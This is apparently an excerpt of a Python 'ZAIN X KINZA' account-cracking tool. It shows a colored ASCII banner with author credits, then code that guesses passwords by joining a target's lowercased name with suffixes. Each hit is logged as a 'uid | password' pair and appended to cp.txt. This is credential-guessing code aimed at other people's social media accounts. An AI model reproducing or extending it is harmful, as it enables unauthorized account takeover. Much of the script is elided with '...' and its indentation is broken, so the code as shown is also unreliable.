...
#MyLogo
def logo():
    os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mZAIN\n\033[1;94m===============================================\n\033[1;90m➣ Author : \033[1;97mSTYLISH ZAIN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-Zain\n\033[1;90m➣ Fb Page: \033[1;97mNAIN OFFICAL\n\033[1;94m===============================================" | lolcat')
def tech_abm():
    os.system("clear")
    logo()
    print("")
    ...
    print("")
    print("")
    os.system('echo -e "\t ZAIN tool has been update      "| lolcat')
    print("")
    print("")
    print("")
    print("")
    ...
    print("")
    print("")
    os.system('echo -e "\t Welcome to new ZAIN X KINZA-Fast tool       "| lolcat')
    print("")
    print("")
    print("")
    print("")
...
def a_menu_select():
	...
	os.system('echo -e "Dev by : ZAIN X KINZA "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
		...
		try:
		    pass1 = name.lower() + p1
                    ...
                    if "loc" in q:
                        ...
                        print("\033[1;93m[ZAIN-CP]➤ " + uid + " | " + pass1)
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
			...
			pass2 = name.lower() + p2
                        ...
                        if "loc" in q:
                            ...
                            print("\033[1;93m[ZAIN-CP]➤ " + uid + " | " + pass2)
                            cp=open("cp.txt","a")
                            cp.write(uid+" | "+pass2+"\n")
                            cp.close()
			    ...
			    pass3 = name.lower() + p3
                            ...
                            if "loc" in q:
                                ...
                                print("\033[1;93m[ZAIN-CP]➤ " + uid + " | " + pass3)
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass3+"\n")
                                cp.close()
